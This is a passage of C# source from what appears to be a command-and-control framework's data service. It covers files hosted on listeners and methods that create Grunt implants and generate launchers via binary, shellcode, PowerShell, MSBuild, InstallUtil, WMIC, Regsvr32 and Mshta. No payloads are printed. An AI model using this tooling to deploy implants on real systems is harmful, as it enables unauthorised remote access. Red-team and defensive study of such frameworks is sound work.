            return await this.GetBridgeListener(matchingListener.Id);
        }
        #endregion

        #region HostedFile Actions
        public async Task<IEnumerable<HostedFile>> GetHostedFiles()
        {
            return await _context.HostedFiles.ToListAsync();
        }

        public async Task<HostedFile> GetHostedFile(int hostedFileId)
        {
            HostedFile file = await _context.HostedFiles.FirstOrDefaultAsync(HF => HF.Id == hostedFileId);
            if (file == null)
            {
                throw new ControllerNotFoundException($"NotFound - HostedFile with id: {hostedFileId}");
            }
            return file;
        }

        public async Task<IEnumerable<HostedFile>> GetHostedFilesForListener(int listenerId)
        {
            Listener listener = await this.GetListener(listenerId);
            return await _context.HostedFiles.Where(HF => HF.ListenerId == listener.Id).ToListAsync();
        }

        public async Task<HostedFile> GetHostedFileForListener(int listenerId, int hostedFileId)
        {
            Listener listener = await this.GetListener(listenerId);
            HostedFile file = await this.GetHostedFile(hostedFileId);
            if (file.ListenerId != listener.Id)
            {
                throw new ControllerBadRequestException($"BadRequest - HostedFile with id: {hostedFileId} is not hosted on Listener with id: {listenerId}");
            }
            return file;
        }

        public async Task<HostedFile> CreateHostedFile(HostedFile file)
        {
            HttpListener listener = await this.GetHttpListener(file.ListenerId);
            if (file.ListenerId != listener.Id)
            {
                throw new ControllerBadRequestException($"BadRequest - HostedFile with listener id: {file.ListenerId} does not match listener with id: {listener.Id}");
            }
            HostedFile existing = await _context.HostedFiles.FirstOrDefaultAsync(HF => HF.Path == file.Path && HF.ListenerId == file.ListenerId);
            if (existing != null)
            {
                // If file already exists and is being hosted, BadRequest
                throw new ControllerBadRequestException($"BadRequest - HostedFile already exists at path: {file.Path}");
            }
            try
            {
                HostedFile hostedFile = listener.HostFile(file);
                // Check if it already exists again, path could have changed
                existing = await _context.HostedFiles.FirstOrDefaultAsync(HF => HF.Path == file.Path && HF.ListenerId == file.ListenerId);
                if (existing != null)
                {
                    throw new ControllerBadRequestException($"BadRequest - HostedFile already exists at: {hostedFile.Path}");
                }
                FileIndicator indicator = new FileIndicator
                {
                    FileName = hostedFile.Path.Split("/").Last(),
                    FilePath = listener.Urls + hostedFile.Path,
                    MD5 = Encrypt.Utilities.GetMD5(Convert.FromBase64String(hostedFile.Content)),
                    SHA1 = Encrypt.Utilities.GetSHA1(Convert.FromBase64String(hostedFile.Content)),
                    SHA2 = Encrypt.Utilities.GetSHA256(Convert.FromBase64String(hostedFile.Content))
                };
                await _context.Indicators.AddAsync(indicator);
                await _context.HostedFiles.AddAsync(hostedFile);
                await _context.SaveChangesAsync();
                // _notifier.OnCreateIndicator(this, indicator);
                // _notifier.OnCreateHostedFile(this, hostedFile);
                return await this.GetHostedFile(hostedFile.Id);
            }
            catch (Exception)
            {
                throw new ControllerBadRequestException($"BadRequest - Error hosting file at path: {file.Path}");
            }
        }

        public async Task<IEnumerable<HostedFile>> CreateHostedFiles(params HostedFile[] files)
        {
            await _context.HostedFiles.AddRangeAsync(files);
            await _context.SaveChangesAsync();
            return files;
        }

        public async Task<HostedFile> EditHostedFile(int listenerId, HostedFile file)
        {
            HttpListener listener = await this.GetHttpListener(listenerId);
            HostedFile matchingFile = await this.GetHostedFileForListener(listenerId, file.Id);
            matchingFile.Path = file.Path;
            matchingFile.Content = file.Content;
            try
            {
                HostedFile updatedFile = listener.HostFile(matchingFile);
                _context.HostedFiles.Update(updatedFile);
                await _context.SaveChangesAsync();
                // _notifier.OnEditHostedFile(this, updatedFile);
                return await this.GetHostedFile(updatedFile.Id);
            }
            catch
            {
                throw new ControllerBadRequestException($"BadRequest - Error hosting file at: {matchingFile.Path}");
            }
        }

        public async Task DeleteHostedFile(int listenerId, int hostedFileId)
        {
            HttpListener listener = await this.GetHttpListener(listenerId);
            HostedFile file = await this.GetHostedFileForListener(listenerId, hostedFileId);
            _context.HostedFiles.Remove(file);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteHostedFile(this, file.Id);
        }
        #endregion

        #region Launcher Actions
        public async Task<IEnumerable<Launcher>> GetLaunchers()
        {
            return await _context.Launchers.ToListAsync();
        }

        public async Task<Launcher> GetLauncher(int id)
        {
            Launcher launcher = await _context.Launchers.FirstOrDefaultAsync(L => L.Id == id);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - Launcher with id: {id}");
            }
            return launcher;
        }

        public async Task<BinaryLauncher> GetBinaryLauncher()
        {
            BinaryLauncher launcher = (BinaryLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Binary);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - BinaryLauncher");
            }
            return launcher;
        }

        public async Task<BinaryLauncher> GenerateBinaryLauncher()
        {
            BinaryLauncher launcher = await this.GetBinaryLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);

            if (!template.CompatibleListenerTypes.Select(LT => LT.Id).Contains(listener.ListenerTypeId))
            {
                throw new ControllerBadRequestException($"BadRequest - ListenerType not compatible with chosen ImplantTemplate");
            }

            Grunt grunt = new Grunt
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValidateCert = launcher.ValidateCert,
                UseCertPinning = launcher.UseCertPinning,
                Delay = launcher.Delay,
                JitterPercent = launcher.JitterPercent,
                ConnectAttempts = launcher.ConnectAttempts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);

            launcher.GetLauncher(
                this.GruntTemplateReplace(template.StagerCode, template, grunt, listener, profile),
                CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher),
                grunt,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetBinaryLauncher();
        }

        public async Task<BinaryLauncher> GenerateBinaryHostedLauncher(HostedFile file)
        {
            BinaryLauncher launcher = await this.GetBinaryLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetBinaryLauncher();
        }

        public async Task<BinaryLauncher> EditBinaryLauncher(BinaryLauncher launcher)
        {
            BinaryLauncher matchingLauncher = await this.GetBinaryLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValidateCert = launcher.ValidateCert;
            matchingLauncher.UseCertPinning = launcher.UseCertPinning;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JitterPercent = launcher.JitterPercent;
            matchingLauncher.ConnectAttempts = launcher.ConnectAttempts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetBinaryLauncher();
        }

        public async Task<ShellCodeLauncher> GetShellCodeLauncher()
        {
            ShellCodeLauncher launcher = (ShellCodeLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.ShellCode);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - ShellCodeLauncher");
            }
            return launcher;
        }

        public async Task<ShellCodeLauncher> GenerateShellCodeLauncher()
        {
            ShellCodeLauncher launcher = await this.GetShellCodeLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);

            if (!template.CompatibleListenerTypes.Select(LT => LT.Id).Contains(listener.ListenerTypeId))
            {
                throw new ControllerBadRequestException($"BadRequest - ListenerType not compatible with chosen ImplantTemplate");
            }

            Grunt grunt = new Grunt
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValidateCert = launcher.ValidateCert,
                UseCertPinning = launcher.UseCertPinning,
                Delay = launcher.Delay,
                JitterPercent = launcher.JitterPercent,
                ConnectAttempts = launcher.ConnectAttempts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);

            launcher.GetLauncher(
                this.GruntTemplateReplace(template.StagerCode, template, grunt, listener, profile),
                CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher),
                grunt,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetShellCodeLauncher();
        }

        public async Task<ShellCodeLauncher> GenerateShellCodeHostedLauncher(HostedFile file)
        {
            ShellCodeLauncher launcher = await this.GetShellCodeLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetShellCodeLauncher();
        }

        public async Task<ShellCodeLauncher> EditShellCodeLauncher(ShellCodeLauncher launcher)
        {
            ShellCodeLauncher matchingLauncher = await this.GetShellCodeLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValidateCert = launcher.ValidateCert;
            matchingLauncher.UseCertPinning = launcher.UseCertPinning;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JitterPercent = launcher.JitterPercent;
            matchingLauncher.ConnectAttempts = launcher.ConnectAttempts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetShellCodeLauncher();
        }

        public async Task<PowerShellLauncher> GetPowerShellLauncher()
        {
            PowerShellLauncher launcher = (PowerShellLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.PowerShell);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - PowerShellLauncher");
            }
            return launcher;
        }

        public async Task<PowerShellLauncher> GeneratePowerShellLauncher()
        {
            PowerShellLauncher launcher = await this.GetPowerShellLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grunt grunt = new Grunt
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValidateCert = launcher.ValidateCert,
                UseCertPinning = launcher.UseCertPinning,
                Delay = launcher.Delay,
                JitterPercent = launcher.JitterPercent,
                ConnectAttempts = launcher.ConnectAttempts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);

            launcher.GetLauncher(
                this.GruntTemplateReplace(template.StagerCode, template, grunt, listener, profile),
                CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher),
                grunt,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetPowerShellLauncher();
        }

        public async Task<PowerShellLauncher> GeneratePowerShellHostedLauncher(HostedFile file)
        {
            PowerShellLauncher launcher = await this.GetPowerShellLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetPowerShellLauncher();
        }

        public async Task<PowerShellLauncher> EditPowerShellLauncher(PowerShellLauncher launcher)
        {
            PowerShellLauncher matchingLauncher = await this.GetPowerShellLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValidateCert = launcher.ValidateCert;
            matchingLauncher.UseCertPinning = launcher.UseCertPinning;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JitterPercent = launcher.JitterPercent;
            matchingLauncher.ConnectAttempts = launcher.ConnectAttempts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.ParameterString = launcher.ParameterString;
            matchingLauncher.PowerShellCode = launcher.PowerShellCode;
            matchingLauncher.EncodedLauncherString = launcher.EncodedLauncherString;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetPowerShellLauncher();
        }

        public async Task<MSBuildLauncher> GetMSBuildLauncher()
        {
            MSBuildLauncher launcher = (MSBuildLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.MSBuild);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - MSBuildLauncher");
            }
            return launcher;
        }

        public async Task<MSBuildLauncher> GenerateMSBuildLauncher()
        {
            MSBuildLauncher launcher = await this.GetMSBuildLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grunt grunt = new Grunt
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValidateCert = launcher.ValidateCert,
                UseCertPinning = launcher.UseCertPinning,
                Delay = launcher.Delay,
                JitterPercent = launcher.JitterPercent,
                ConnectAttempts = launcher.ConnectAttempts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);

            launcher.GetLauncher(
                this.GruntTemplateReplace(template.StagerCode, template, grunt, listener, profile),
                CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher),
                grunt,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetMSBuildLauncher();
        }

        public async Task<MSBuildLauncher> GenerateMSBuildHostedLauncher(HostedFile file)
        {
            MSBuildLauncher launcher = await this.GetMSBuildLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetMSBuildLauncher();
        }

        public async Task<MSBuildLauncher> EditMSBuildLauncher(MSBuildLauncher launcher)
        {
            MSBuildLauncher matchingLauncher = await this.GetMSBuildLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValidateCert = launcher.ValidateCert;
            matchingLauncher.UseCertPinning = launcher.UseCertPinning;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JitterPercent = launcher.JitterPercent;
            matchingLauncher.ConnectAttempts = launcher.ConnectAttempts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.TargetName = launcher.TargetName;
            matchingLauncher.TaskName = launcher.TaskName;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetMSBuildLauncher();
        }

        public async Task<InstallUtilLauncher> GetInstallUtilLauncher()
        {
            InstallUtilLauncher launcher = (InstallUtilLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.InstallUtil);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - InstallUtilLauncher");
            }
            return launcher;
        }

        public async Task<InstallUtilLauncher> GenerateInstallUtilLauncher()
        {
            InstallUtilLauncher launcher = await this.GetInstallUtilLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grunt grunt = new Grunt
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValidateCert = launcher.ValidateCert,
                UseCertPinning = launcher.UseCertPinning,
                Delay = launcher.Delay,
                JitterPercent = launcher.JitterPercent,
                ConnectAttempts = launcher.ConnectAttempts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);

            launcher.GetLauncher(
                this.GruntTemplateReplace(template.StagerCode, template, grunt, listener, profile),
                CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher),
                grunt,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetInstallUtilLauncher();
        }

        public async Task<InstallUtilLauncher> GenerateInstallUtilHostedLauncher(HostedFile file)
        {
            InstallUtilLauncher launcher = await this.GetInstallUtilLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetInstallUtilLauncher();
        }

        public async Task<InstallUtilLauncher> EditInstallUtilLauncher(InstallUtilLauncher launcher)
        {
            InstallUtilLauncher matchingLauncher = await this.GetInstallUtilLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValidateCert = launcher.ValidateCert;
            matchingLauncher.UseCertPinning = launcher.UseCertPinning;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JitterPercent = launcher.JitterPercent;
            matchingLauncher.ConnectAttempts = launcher.ConnectAttempts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.StagerCode = launcher.StagerCode;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetInstallUtilLauncher();
        }

        public async Task<WmicLauncher> GetWmicLauncher()
        {
            WmicLauncher launcher = (WmicLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Wmic);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - WmicLauncher");
            }
            return launcher;
        }

        public async Task<WmicLauncher> GenerateWmicLauncher()
        {
            WmicLauncher launcher = await this.GetWmicLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grunt grunt = new Grunt
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValidateCert = launcher.ValidateCert,
                UseCertPinning = launcher.UseCertPinning,
                Delay = launcher.Delay,
                JitterPercent = launcher.JitterPercent,
                ConnectAttempts = launcher.ConnectAttempts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);

            launcher.GetLauncher(
                this.GruntTemplateReplace(template.StagerCode, template, grunt, listener, profile),
                CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher),
                grunt,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetWmicLauncher();
        }

        public async Task<WmicLauncher> GenerateWmicHostedLauncher(HostedFile file)
        {
            WmicLauncher launcher = await this.GetWmicLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetWmicLauncher();
        }

        public async Task<WmicLauncher> EditWmicLauncher(WmicLauncher launcher)
        {
            WmicLauncher matchingLauncher = await this.GetWmicLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValidateCert = launcher.ValidateCert;
            matchingLauncher.UseCertPinning = launcher.UseCertPinning;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JitterPercent = launcher.JitterPercent;
            matchingLauncher.ConnectAttempts = launcher.ConnectAttempts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.ProgId = launcher.ProgId;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetWmicLauncher();
        }

        public async Task<Regsvr32Launcher> GetRegsvr32Launcher()
        {
            Regsvr32Launcher launcher = (Regsvr32Launcher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Regsvr32);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - Regsvr32Launcher");
            }
            return launcher;
        }

        public async Task<Regsvr32Launcher> GenerateRegsvr32Launcher()
        {
            Regsvr32Launcher launcher = await this.GetRegsvr32Launcher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grunt grunt = new Grunt
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValidateCert = launcher.ValidateCert,
                UseCertPinning = launcher.UseCertPinning,
                Delay = launcher.Delay,
                JitterPercent = launcher.JitterPercent,
                ConnectAttempts = launcher.ConnectAttempts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);

            launcher.GetLauncher(
                this.GruntTemplateReplace(template.StagerCode, template, grunt, listener, profile),
                CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher),
                grunt,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetRegsvr32Launcher();
        }

        public async Task<Regsvr32Launcher> GenerateRegsvr32HostedLauncher(HostedFile file)
        {
            Regsvr32Launcher launcher = await this.GetRegsvr32Launcher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetRegsvr32Launcher();
        }

        public async Task<Regsvr32Launcher> EditRegsvr32Launcher(Regsvr32Launcher launcher)
        {
            Regsvr32Launcher matchingLauncher = await this.GetRegsvr32Launcher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValidateCert = launcher.ValidateCert;
            matchingLauncher.UseCertPinning = launcher.UseCertPinning;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JitterPercent = launcher.JitterPercent;
            matchingLauncher.ConnectAttempts = launcher.ConnectAttempts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.ParameterString = launcher.ParameterString;
            matchingLauncher.DllName = launcher.DllName;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.ProgId = launcher.ProgId;
            matchingLauncher.ParameterString = launcher.ParameterString;
            matchingLauncher.DllName = launcher.DllName;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetRegsvr32Launcher();
        }

        public async Task<MshtaLauncher> GetMshtaLauncher()
        {
            MshtaLauncher launcher = (MshtaLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Mshta);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - MshtaLauncher");
            }
            return launcher;
        }

        public async Task<MshtaLauncher> GenerateMshtaLauncher()
        {
            MshtaLauncher launcher = await this.GetMshtaLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grunt grunt = new Grunt
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValidateCert = launcher.ValidateCert,
                UseCertPinning = launcher.UseCertPinning,
                Delay = launcher.Delay,
                JitterPercent = launcher.JitterPercent,
                ConnectAttempts = launcher.ConnectAttempts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);

            launcher.GetLauncher(
                this.GruntTemplateReplace(template.StagerCode, template, grunt, listener, profile),
                CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher),
                grunt,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetMshtaLauncher();
        }

        public async Task<MshtaLauncher> GenerateMshtaHostedLauncher(HostedFile file)
        {
            MshtaLauncher launcher = await this.GetMshtaLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
